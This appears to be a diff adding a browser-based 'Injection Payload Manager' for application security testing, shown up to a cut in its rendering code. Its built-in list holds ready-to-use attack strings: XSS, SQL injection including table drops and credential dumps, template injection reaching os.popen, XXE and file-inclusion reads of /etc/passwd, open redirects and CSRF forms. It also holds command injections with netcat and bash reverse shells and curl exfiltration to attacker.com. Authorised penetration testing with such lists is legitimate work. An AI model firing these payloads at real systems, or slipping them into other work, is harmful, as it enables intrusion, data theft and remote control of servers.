@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Injection Payload Manager — AppSec Toolkit</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#0a0e0f; --surface:#111518; --surface2:#161c1f; --surface3:#1c2428;
+  --border:#1e2d32; --border2:#243540;
+  --accent:#00ff88; --accent2:#00d4ff; --accent4:#ffcc00;
+  --text:#e2eff5; --text2:#7a9baa; --text3:#4a6472;
+  --danger:#ff4455;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'Space Grotesk',sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+.container{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:0 20px}
+header{border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(0,255,136,.04) 0%,transparent 100%);padding:16px 0;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px)}
+.header-inner{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.logo-area{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.logo-icon{width:34px;height:34px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:17px;box-shadow:0 0 18px rgba(0,255,136,.3)}
+.logo-title{font-size:17px;font-weight:700;color:var(--accent);letter-spacing:-.3px;font-family:'JetBrains Mono',monospace}
+.logo-sub{font-size:10px;color:var(--text3);letter-spacing:1px;text-transform:uppercase;margin-top:1px}
+.header-stats{display:flex;gap:10px;margin-left:16px}
+.stat{display:flex;flex-direction:column;align-items:center;padding:3px 10px;border:1px solid var(--border);border-radius:6px;background:var(--surface2);min-width:60px}
+.stat-val{font-family:'JetBrains Mono',monospace;font-size:17px;font-weight:700;color:var(--accent);line-height:1}
+.stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
+.header-actions{margin-left:auto;display:flex;gap:7px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:5px;padding:7px 13px;border-radius:6px;font-size:12px;font-weight:500;cursor:pointer;transition:all .15s;border:1px solid transparent;font-family:'JetBrains Mono',monospace;white-space:nowrap}
+.btn-ghost{background:transparent;border-color:var(--border2);color:var(--text2)}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,255,136,.05)}
+.btn-primary{background:var(--accent);color:#000;font-weight:700;border-color:var(--accent)}
+.btn-primary:hover{background:#00cc6e;box-shadow:0 0 18px rgba(0,255,136,.4)}
+.btn-danger{background:rgba(255,68,85,.1);border-color:var(--danger);color:var(--danger)}
+.btn-danger:hover{background:rgba(255,68,85,.2)}
+.btn-sm{padding:5px 9px;font-size:11px}
+.btn-copy{background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.3);color:var(--accent)}
+.btn-copy:hover{background:rgba(0,255,136,.18)}
+.btn-copy.copied{background:rgba(0,255,136,.22);border-color:var(--accent)}
+.toolbar{padding:14px 0;display:flex;gap:9px;align-items:center;flex-wrap:wrap}
+.search-wrap{position:relative;flex:1;min-width:180px}
+.search-icon{position:absolute;left:11px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px;pointer-events:none}
+.search-input{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:9px 11px 9px 34px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;transition:border-color .15s,box-shadow .15s}
+.search-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,.1)}
+.search-input::placeholder{color:var(--text3)}
+select.filter-select{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:9px 28px 9px 11px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;cursor:pointer;min-width:110px;transition:border-color .15s;-webkit-appearance:none;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%234a6472' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 9px center}
+select.filter-select:focus{border-color:var(--accent)}
+.tags-bar{display:flex;gap:5px;flex-wrap:wrap;padding:0 0 10px}
+.tag-pill{padding:3px 9px;border-radius:4px;font-size:10px;font-family:'JetBrains Mono',monospace;font-weight:600;letter-spacing:.5px;cursor:pointer;border:1px solid transparent;transition:all .15s;user-select:none}
+.tag-pill[data-tag="XSS"]{background:rgba(255,68,85,.12);border-color:rgba(255,68,85,.4);color:#ff4455}
+.tag-pill[data-tag="SQLi"]{background:rgba(255,140,0,.12);border-color:rgba(255,140,0,.4);color:#ff8c00}
+.tag-pill[data-tag="SSTI"]{background:rgba(204,68,255,.12);border-color:rgba(204,68,255,.4);color:#cc44ff}
+.tag-pill[data-tag="CMDi"]{background:rgba(0,212,255,.12);border-color:rgba(0,212,255,.4);color:#00d4ff}
+.tag-pill[data-tag="XXE"]{background:rgba(0,255,136,.12);border-color:rgba(0,255,136,.4);color:#00ff88}
+.tag-pill[data-tag="LFI"]{background:rgba(255,204,0,.12);border-color:rgba(255,204,0,.4);color:#ffcc00}
+.tag-pill[data-tag="Open Redirect"]{background:rgba(255,107,53,.12);border-color:rgba(255,107,53,.4);color:#ff6b35}
+.tag-pill[data-tag="CSRF"]{background:rgba(255,136,204,.12);border-color:rgba(255,136,204,.4);color:#ff88cc}
+.tag-pill[data-tag="All"]{background:var(--surface2);border-color:var(--border2);color:var(--text2)}
+.tag-pill[data-tag="Favorites"]{background:rgba(255,204,0,.08);border-color:rgba(255,204,0,.3);color:#ffcc00}
+.tag-pill.active{filter:brightness(1.35);box-shadow:0 0 8px rgba(0,255,136,.25)}
+.upload-zone{border:2px dashed var(--border2);border-radius:10px;background:var(--surface2);text-align:center;padding:26px 20px;margin-bottom:14px;cursor:pointer;transition:all .2s;position:relative}
+.upload-zone:hover,.upload-zone.dragover{border-color:var(--accent);background:rgba(0,255,136,.04);box-shadow:0 0 18px rgba(0,255,136,.1)}
+.upload-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
+.upload-icon{font-size:26px;margin-bottom:7px}
+.upload-text{font-size:13px;color:var(--text2)}
+.upload-text span{color:var(--accent);font-weight:600}
+.upload-hint{font-size:10px;color:var(--text3);margin-top:4px;font-family:'JetBrains Mono',monospace}
+.payload-list{display:flex;flex-direction:column;gap:4px;margin-bottom:24px}
+.payload-item{display:flex;align-items:center;gap:9px;padding:10px 13px;background:var(--surface);border:1px solid var(--border);border-radius:8px;transition:all .12s;animation:slideIn .18s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:translateY(0)}}
+.payload-item:hover{border-color:var(--border2);background:var(--surface2);transform:translateX(2px)}
+.fav-btn{flex:0 0 auto;background:none;border:none;color:var(--text3);cursor:pointer;font-size:15px;transition:all .15s;padding:2px;line-height:1}
+.fav-btn:hover{color:#ffcc00;transform:scale(1.2)}
+.fav-btn.active{color:#ffcc00}
+.payload-text{flex:1;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;user-select:all;line-height:1.4}
+.payload-text:hover{color:var(--accent)}
+.payload-meta{display:flex;align-items:center;gap:6px;flex:0 0 auto}
+.payload-tag{padding:2px 6px;border-radius:3px;font-size:9px;font-family:'JetBrains Mono',monospace;font-weight:700;letter-spacing:.5px;flex-shrink:0}
+.payload-tag.xss{background:rgba(255,68,85,.15);color:#ff4455}
+.payload-tag.sqli{background:rgba(255,140,0,.15);color:#ff8c00}
+.payload-tag.ssti{background:rgba(204,68,255,.15);color:#cc44ff}
+.payload-tag.cmdi{background:rgba(0,212,255,.15);color:#00d4ff}
+.payload-tag.xxe{background:rgba(0,255,136,.15);color:#00ff88}
+.payload-tag.lfi{background:rgba(255,204,0,.15);color:#ffcc00}
+.payload-tag.open-redirect{background:rgba(255,107,53,.15);color:#ff6b35}
+.payload-tag.csrf{background:rgba(255,136,204,.15);color:#ff88cc}
+.payload-tag.uploaded{background:rgba(122,155,170,.15);color:var(--text2)}
+.source-badge{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;background:var(--surface3);padding:2px 5px;border-radius:3px;border:1px solid var(--border)}
+.bulk-bar{background:var(--surface2);border:1px solid var(--border2);border-radius:8px;padding:9px 13px;display:flex;align-items:center;gap:9px;margin-bottom:7px;flex-wrap:wrap}
+.bulk-info{font-size:12px;color:var(--text2);flex:1;font-family:'JetBrains Mono',monospace}
+.bulk-info span{color:var(--accent);font-weight:700}
+.add-form{background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:18px;margin-bottom:14px;display:none}
+.add-form.open{display:block}
+.add-form-title{font-size:13px;font-weight:600;color:var(--accent);margin-bottom:11px;font-family:'JetBrains Mono',monospace}
+.form-row{display:flex;gap:9px;flex-wrap:wrap;margin-bottom:9px}
+.form-row textarea{flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:9px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical;min-height:65px;outline:none}
+.form-row textarea:focus{border-color:var(--accent)}
+.form-row select{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:9px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;min-width:120px}
+.encoder-panel{background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:18px;margin-bottom:14px;display:none}
+.encoder-panel.open{display:block}
+.encoder-title{font-size:13px;font-weight:600;color:var(--accent2);margin-bottom:11px;font-family:'JetBrains Mono',monospace}
+.encoder-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.encoder-grid textarea{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:9px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;resize:vertical;min-height:85px;outline:none;width:100%}
+.encoder-grid textarea:focus{border-color:var(--accent2)}
+.encoder-btns{display:flex;gap:5px;flex-wrap:wrap;margin:9px 0}
+.enc-btn{background:var(--surface3);border:1px solid var(--border);border-radius:5px;padding:5px 9px;font-size:10px;color:var(--text2);cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .12s}
+.enc-btn:hover{border-color:var(--accent2);color:var(--accent2)}
+.enc-label{font-size:10px;color:var(--text3);margin-bottom:4px;font-family:'JetBrains Mono',monospace}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
+.modal-overlay.open{display:flex}
+.modal{background:var(--surface);border:1px solid var(--border2);border-radius:12px;padding:22px;max-width:740px;width:100%;box-shadow:0 24px 60px rgba(0,0,0,.6);animation:modalIn .18s ease;max-height:90vh;overflow-y:auto}
+@keyframes modalIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+.modal-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.modal-title{font-size:14px;font-weight:700;color:var(--accent);font-family:'JetBrains Mono',monospace}
+.modal-close{background:none;border:none;color:var(--text3);font-size:18px;cursor:pointer}
+.modal-close:hover{color:var(--danger)}
+.modal-code{background:var(--surface3);border:1px solid var(--border2);border-radius:8px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--accent2);word-break:break-all;white-space:pre-wrap;margin-bottom:14px;line-height:1.6;max-height:280px;overflow-y:auto}
+.modal-meta{display:flex;gap:7px;flex-wrap:wrap;align-items:center}
+.modal-actions{margin-top:14px;display:flex;gap:7px}
+.toast{position:fixed;bottom:22px;right:22px;background:var(--surface3);border:1px solid var(--accent);color:var(--accent);padding:9px 15px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:12px;box-shadow:0 4px 18px rgba(0,255,136,.2);opacity:0;transform:translateY(8px);transition:all .2s;pointer-events:none;z-index:9999}
+.toast.show{opacity:1;transform:translateY(0)}
+.no-results{text-align:center;padding:40px;color:var(--text3);font-family:'JetBrains Mono',monospace;font-size:13px}
+.no-results .emoji{font-size:30px;margin-bottom:8px}
+mark{background:rgba(0,255,136,.2);color:var(--accent);border-radius:2px;padding:0 1px}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:var(--surface)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+@media(max-width:600px){.header-stats{display:none}.encoder-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container header-inner">
+    <div class="logo-area">
+      <div class="logo-icon">&#128737;</div>
+      <div>
+        <div class="logo-title">PAYLOAD//MGR</div>
+        <div class="logo-sub">AppSec Injection Toolkit</div>
+      </div>
+    </div>
+    <div class="header-stats">
+      <div class="stat"><span class="stat-val" id="stat-total">0</span><span class="stat-label">Total</span></div>
+      <div class="stat"><span class="stat-val" id="stat-filtered">0</span><span class="stat-label">Shown</span></div>
+      <div class="stat"><span class="stat-val" id="stat-favs">0</span><span class="stat-label">Favs</span></div>
+      <div class="stat"><span class="stat-val" id="stat-uploaded">0</span><span class="stat-label">Uploaded</span></div>
+    </div>
+    <div class="header-actions">
+      <button class="btn btn-ghost btn-sm" onclick="PM.toggleEncoder()">&#9881; Encoder</button>
+      <button class="btn btn-ghost btn-sm" onclick="PM.toggleAddForm()">&#43; Add</button>
+      <button class="btn btn-ghost btn-sm" onclick="PM.exportFavs()">&#8659; Favs</button>
+      <button class="btn btn-ghost btn-sm" onclick="PM.exportAll()">&#8659; All</button>
+      <button class="btn btn-danger btn-sm" onclick="PM.clearUploaded()">&#10005; Clear Uploaded</button>
+    </div>
+  </div>
+</header>
+
+<div class="container" style="padding-top:14px">
+
+  <div class="encoder-panel" id="encoderPanel">
+    <div class="encoder-title">&#9881; Payload Encoder / Decoder</div>
+    <div class="encoder-grid">
+      <div>
+        <div class="enc-label">INPUT</div>
+        <textarea id="encInput" placeholder="Paste payload here..."></textarea>
+      </div>
+      <div>
+        <div class="enc-label">OUTPUT</div>
+        <textarea id="encOutput" placeholder="Encoded / decoded output..." readonly></textarea>
+      </div>
+    </div>
+    <div class="encoder-btns">
+      <button class="enc-btn" onclick="PM.doEncode('url')">URL Encode</button>
+      <button class="enc-btn" onclick="PM.doEncode('url2')">Double URL</button>
+      <button class="enc-btn" onclick="PM.doEncode('html')">HTML Entity</button>
+      <button class="enc-btn" onclick="PM.doEncode('base64')">Base64</button>
+      <button class="enc-btn" onclick="PM.doEncode('hex')">Hex \x</button>
+      <button class="enc-btn" onclick="PM.doEncode('unicode')">Unicode \u</button>
+      <button class="enc-btn" onclick="PM.doDecode('url')">URL Decode</button>
+      <button class="enc-btn" onclick="PM.doDecode('base64')">Base64 Decode</button>
+      <button class="enc-btn" onclick="PM.copyEncOutput()">&#128203; Copy Output</button>
+    </div>
+  </div>
+
+  <div class="add-form" id="addForm">
+    <div class="add-form-title">&#43; Add Custom Payload</div>
+    <div class="form-row">
+      <textarea id="newPayloadText" placeholder="Enter payload string..."></textarea>
+      <select id="newPayloadTag">
+        <option value="XSS">XSS</option>
+        <option value="SQLi">SQLi</option>
+        <option value="SSTI">SSTI</option>
+        <option value="CMDi">CMDi</option>
+        <option value="XXE">XXE</option>
+        <option value="LFI">LFI</option>
+        <option value="Open Redirect">Open Redirect</option>
+        <option value="CSRF">CSRF</option>
+      </select>
+    </div>
+    <button class="btn btn-primary btn-sm" onclick="PM.addManual()">Add Payload</button>
+    <button class="btn btn-ghost btn-sm" onclick="PM.toggleAddForm()">Cancel</button>
+  </div>
+
+  <div class="upload-zone" id="uploadZone" ondragover="PM.dragOver(event)" ondragleave="PM.dragLeave(event)" ondrop="PM.dropFile(event)">
+    <input type="file" accept=".txt,.json,.csv" onchange="PM.handleFile(event)">
+    <div class="upload-icon">&#128194;</div>
+    <div class="upload-text"><span>Click to upload</span> or drag &amp; drop</div>
+    <div class="upload-hint">.txt (one payload per line) &bull; .json &bull; .csv &mdash; auto-detects injection type</div>
+  </div>
+
+  <div class="toolbar">
+    <div class="search-wrap">
+      <span class="search-icon">&#128269;</span>
+      <input type="text" class="search-input" id="searchInput" placeholder="Search payloads... (regex supported)" oninput="PM.render()">
+    </div>
+    <select class="filter-select" id="tagFilter" onchange="PM.render()">
+      <option value="All">All Types</option>
+      <option value="XSS">XSS</option>
+      <option value="SQLi">SQLi</option>
+      <option value="SSTI">SSTI</option>
+      <option value="CMDi">CMDi</option>
+      <option value="XXE">XXE</option>
+      <option value="LFI">LFI</option>
+      <option value="Open Redirect">Open Redirect</option>
+      <option value="CSRF">CSRF</option>
+    </select>
+    <select class="filter-select" id="sourceFilter" onchange="PM.render()">
+      <option value="All">All Sources</option>
+      <option value="built-in">Built-in</option>
+      <option value="uploaded">Uploaded</option>
+      <option value="manual">Manual</option>
+    </select>
+    <button class="btn btn-ghost btn-sm" id="favToggle" onclick="PM.toggleFavFilter()">&#9734; Favorites</button>
+  </div>
+
+  <div class="tags-bar" id="tagsBar"></div>
+
+  <div class="bulk-bar" id="bulkBar" style="display:none">
+    <div class="bulk-info"><span id="filteredCount">0</span> payloads shown</div>
+    <button class="btn btn-ghost btn-sm" onclick="PM.copyAllVisible()">&#128203; Copy All</button>
+    <button class="btn btn-ghost btn-sm" onclick="PM.favAllVisible()">&#9733; Fav All</button>
+  </div>
+
+  <div class="payload-list" id="payloadList"></div>
+</div>
+
+<div class="modal-overlay" id="modalOverlay" onclick="PM.overlayClick(event)">
+  <div class="modal" id="modalBox">
+    <div class="modal-header">
+      <div class="modal-title" id="modalTitle">Payload Detail</div>
+      <button class="modal-close" onclick="PM.closeModal()">&#10005;</button>
+    </div>
+    <div class="modal-code" id="modalCode"></div>
+    <div class="modal-meta" id="modalMeta"></div>
+    <div class="modal-actions">
+      <button class="btn btn-copy" onclick="PM.copyModalPayload()">&#128203; Copy Payload</button>
+      <button class="btn btn-ghost btn-sm" onclick="PM.sendToEncoder()">&#9881; Send to Encoder</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+var PM = (function() {
+  "use strict";
+
+  var payloads = [];
+  var favs = new Set(JSON.parse(localStorage.getItem('pm_favs') || '[]'));
+  var showFavsOnly = false;
+  var currentModalId = null;
+
+  /* ── Built-in payload data ─────────────────────────────────────── */
+  var BUILTIN = [
+    /* XSS */
+    ["<script>alert(1)<\/script>","XSS"],
+    ["<img src=x onerror=alert(1)>","XSS"],
+    ["<svg onload=alert(1)>","XSS"],
+    ["<body onload=alert(1)>","XSS"],
+    ["javascript:alert(1)","XSS"],
+    ['<iframe src="javascript:alert(1)">','XSS'],
+    ['"><script>alert(1)<\/script>',"XSS"],
+    ["'-alert(1)-'","XSS"],
+    ["${alert(1)}","XSS"],
+    ["<svg><script>alert&#40;1&#41;<\/script><\/svg>","XSS"],
+    ["<ScRiPt>alert(1)<\/ScRiPt>","XSS"],
+    ["<img src=x onerror=\"eval('alert(1)')\">","XSS"],
+    ["%3Cscript%3Ealert(1)%3C/script%3E","XSS"],
+    ["<details open ontoggle=alert(1)>","XSS"],
+    ["<video><source onerror=alert(1)>","XSS"],
+    ["<input autofocus onfocus=alert(1)>","XSS"],
+    ["<svg/onload=alert(1)>","XSS"],
+    ['<iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">',"XSS"],
+    ["<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">","XSS"],
+    ["<div onmouseover=alert(1)>hover</div>","XSS"],
+    ["<button onclick=alert(1)>click</button>","XSS"],
+    ["data:text/html,<script>alert(1)<\/script>","XSS"],
+    ['<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',"XSS"],
+    ['<form action="javascript:alert(1)"><input type=submit value="Click"></form>',"XSS"],
+    ["<script>document.body.innerHTML='<img src=x onerror=alert(1)>'<\/script>","XSS"],
+    ["<script>location='javascript:alert(1)'<\/script>","XSS"],
+    ["\\u003cscript\\u003ealert(1)\\u003c/script\\u003e","XSS"],
+    ['<base href="javascript:alert(1)//"><a href="#">Click</a>',"XSS"],
+    ["<style>@import'javascript:alert(\"XSS\")';<\/style>","XSS"],
+    ["<img src=x onerror=alert&lpar;1&rpar;>","XSS"],
+    /* SQLi */
+    ["' OR '1'='1","SQLi"],
+    ["' OR 1=1--","SQLi"],
+    ["'; DROP TABLE users;--","SQLi"],
+    ["' UNION SELECT NULL,NULL--","SQLi"],
+    ["1' AND SLEEP(5)--","SQLi"],
+    ["admin'--","SQLi"],
+    ["' OR 'x'='x","SQLi"],
+    ["1; WAITFOR DELAY '0:0:5'--","SQLi"],
+    ["' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--","SQLi"],
+    ["' UNION SELECT username,password FROM users--","SQLi"],
+    ["1 OR 1=1","SQLi"],
+    ["\" OR \"\"=\"","SQLi"],
+    ["' AND 1=1--","SQLi"],
+    ["1; SELECT * FROM information_schema.tables--","SQLi"],
+    ["' OR EXISTS(SELECT * FROM users)--","SQLi"],
+    /* SSTI */
+    ["{{7*7}}","SSTI"],
+    ["{{config}}","SSTI"],
+    ["{{self.__dict__}}","SSTI"],
+    ["{%import os%}{{os.popen('id').read()}}","SSTI"],
+    ["{{''.__class__.__mro__[2].__subclasses__()}}","SSTI"],
+    ["<%= 7*7 %>","SSTI"],
+    ["${7*7}","SSTI"],
+    ["#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))","SSTI"],
+    ["{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}","SSTI"],
+    ["#{7*7}","SSTI"],
+    ["*{7*7}","SSTI"],
+    /* CMDi */
+    ["; ls -la","CMDi"],
+    ["| id","CMDi"],
+    ["&& whoami","CMDi"],
+    ["`id`","CMDi"],
+    ["$(id)","CMDi"],
+    ["; cat /etc/passwd","CMDi"],
+    ["%0a id","CMDi"],
+    ["; ping -c 1 attacker.com","CMDi"],
+    ["| nc -e /bin/sh attacker.com 4444","CMDi"],
+    ["; curl http://attacker.com/?x=$(cat /etc/passwd)","CMDi"],
+    ["$(curl http://attacker.com/)","CMDi"],
+    ["; bash -i >& /dev/tcp/attacker.com/4444 0>&1","CMDi"],
+    ["|| python3 -c 'import os;os.system(\"id\")'","CMDi"],
+    /* XXE */
+    ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","XXE"],
+    ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>","XXE"],
+    ["<!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>","XXE"],
+    ["<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM \"file:///C:/Windows/win.ini\">]><data>&file;</data>","XXE"],
+    ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>","XXE"],
+    /* LFI */
+    ["../etc/passwd","LFI"],
+    ["../../etc/passwd","LFI"],
+    ["../../../etc/passwd","LFI"],
+    ["....//....//etc/passwd","LFI"],
+    ["%2e%2e%2fetc%2fpasswd","LFI"],
+    ["%252e%252e%252fetc%252fpasswd","LFI"],
+    ["..%2fetc%2fpasswd","LFI"],
+    ["/proc/self/environ","LFI"],
+    ["php://filter/convert.base64-encode/resource=index.php","LFI"],
+    ["php://input","LFI"],
+    ["data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=","LFI"],
+    ["..\\..\\..\\windows\\win.ini","LFI"],
+    /* Open Redirect */
+    ["https://evil.com","Open Redirect"],
+    ["//evil.com","Open Redirect"],
+    ["/\\evil.com","Open Redirect"],
+    ["%2f%2fevil.com","Open Redirect"],
+    ["https:evil.com","Open Redirect"],
+    ["///evil.com","Open Redirect"],
+    ["/%09/evil.com","Open Redirect"],
+    ["/redirect?url=https://evil.com","Open Redirect"],
+    ["https://trusted.com@evil.com","Open Redirect"],
+    ["//%0d%0aLocation:https://evil.com","Open Redirect"],
+    /* CSRF */
+    ['<form action="https://bank.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"><button>Click</button></form>',"CSRF"],
+    ['<img src="https://victim.com/api/delete?id=1">',"CSRF"],
+    ["<script>fetch('https://victim.com/api/action',{method:'POST',credentials:'include',body:'data=evil'})<\/script>","CSRF"],
+    ["<script>var x=new XMLHttpRequest();x.open('POST','https://victim.com/transfer');x.withCredentials=true;x.send('amount=1000&to=attacker')<\/script>","CSRF"]
+  ];
+
+  /* ── uid ─────────────────────────────────────────────────────────── */
+  function uid() {
+    return Math.random().toString(36).slice(2) + Date.now().toString(36);
+  }
+
+  /* ── classify ────────────────────────────────────────────────────── */
+  function classify(p) {
+    if (/select\s|insert\s|union\s|drop\s|sleep\s*\(|waitfor|1=1|or\s+'|--\s|xp_|information_schema/i.test(p)) return 'SQLi';
+    if (/\{\{|\{%|#{|<%=|freemarker|velocity|twig|smarty|jinja/i.test(p)) return 'SSTI';
+    if (/;(ls|cat|pwd|id|whoami|uname|wget|curl|bash|sh)\b|`[^`]+`|\$\([^)]+\)|\|\s*(ls|id|cat)\b|&&\s*(ls|id)\b/i.test(p)) return 'CMDi';
+    if (/<!entity|<!doctype.*system|file:\/\/|\/etc\/passwd|xmlns:|xinclude/i.test(p)) return 'XXE';
+    if (/\.\.[\/\\]|\/etc\/|\/proc\/|\/var\/|c:\\|%2e%2e|%252e|php:\/\//i.test(p)) return 'LFI';
+    if (/\/\/[a-z0-9.-]+\.[a-z]{2,}|open.?redirect/i.test(p) && !/script|alert/i.test(p)) return 'Open Redirect';
+    if (/csrf|xsrf|_token|same.?site/i.test(p)) return 'CSRF';
+    return 'XSS';
+  }
+
+  /* ── loadBuiltins ────────────────────────────────────────────────── */
+  function loadBuiltins() {
+    for (var i = 0; i < BUILTIN.length; i++) {
+      payloads.push({ text: BUILTIN[i][0], tag: BUILTIN[i][1], source: 'built-in', id: uid() });
+    }
+  }
+
+  /* ── file upload ─────────────────────────────────────────────────── */
+  function handleFile(e) { var f = e.target.files[0]; if (f) parseFile(f); }
+  function dragOver(e) { e.preventDefault(); document.getElementById('uploadZone').classList.add('dragover'); }
+  function dragLeave() { document.getElementById('uploadZone').classList.remove('dragover'); }
+  function dropFile(e) {
+    e.preventDefault();
+    document.getElementById('uploadZone').classList.remove('dragover');
+    var f = e.dataTransfer.files[0];
+    if (f) parseFile(f);
+  }
+
+  function parseFile(file) {
+    var reader = new FileReader();
+    reader.onload = function(ev) {
+      var text = ev.target.result;
+      var lines = [];
+      var ext = file.name.split('.').pop().toLowerCase();
+      if (ext === 'json') {
+        try {
+          var data = JSON.parse(text);
+          if (Array.isArray(data)) {
+            lines = data.map(function(d) { return typeof d === 'string' ? d : JSON.stringify(d); });
+          } else {
+            lines = Object.values(data).map(function(d) { return typeof d === 'string' ? d : JSON.stringify(d); });
+          }
+        } catch(err) { lines = text.split('\n'); }
+      } else {
+        lines = text.split('\n');
+      }
+      var added = 0;
+      lines.forEach(function(line) {
+        var t = line.trim();
+        if (t) {
+          payloads.push({ text: t, tag: classify(t), source: 'uploaded', id: uid() });
+          added++;
+        }
+      });
+      showToast('Loaded ' + added + ' payloads from ' + file.name);
+      render(); updateStats();
+    };
+    reader.readAsText(file);
+  }
+
+  /* ── helpers ─────────────────────────────────────────────────────── */
+  function esc(s) {
+    return String(s)
+      .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  }
+
+  function tagClass(tag) {
+    return tag.toLowerCase().replace(/\s+/g,'-').replace(/[^a-z0-9-]/g,'');
+  }
+
+  function highlight(text, q) {
+    var safe = esc(text);
+    if (!q) return safe;
+    try {
+      var escaped = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+      return safe.replace(new RegExp('(' + escaped + ')', 'gi'), '<mark>$1</mark>');
+    } catch(e) { return safe; }
+  }
+
+  function getFiltered() {
+    var q   = document.getElementById('searchInput').value.trim();
+    var tagF = document.getElementById('tagFilter').value;
+    var srcF = document.getElementById('sourceFilter').value;
+    return payloads.filter(function(p) {
+      if (showFavsOnly && !favs.has(p.id)) return false;
+      if (tagF !== 'All' && p.tag !== tagF) return false;
+      if (srcF !== 'All' && p.source !== srcF) return false;
+      if (q) {
+        try { return new RegExp(q, 'i').test(p.text); }
+        catch(e) { return p.text.toLowerCase().indexOf(q.toLowerCase()) !== -1; }
+      }
+      return true;
+    });
+  }
+
+  /* ── render ──────────────────────────────────────────────────────── */
+  function render() {
+    var filtered = getFiltered();
+    var q = document.getElementById('searchInput').value.trim();
+    var list = document.getElementById('payloadList');
+    document.getElementById('filteredCount').textContent = filtered.length;
+    document.getElementById('stat-filtered').textContent = filtered.length;
+    document.getElementById('bulkBar').style.display = filtered.length ? 'flex' : 'none';
+    if (!filtered.length) {
+      list.innerHTML = '<div class="no-results"><div class="emoji">&#128269;</div>No payloads match your filters.</div>';
+      return;
+    }
+    var html = '';
+    for (var i = 0; i < filtered.length; i++) {
+      var p = filtered[i];
+      var isFav = favs.has(p.id);
+      var tc = tagClass(p.tag);
+      html += '<div class="payload-item">';
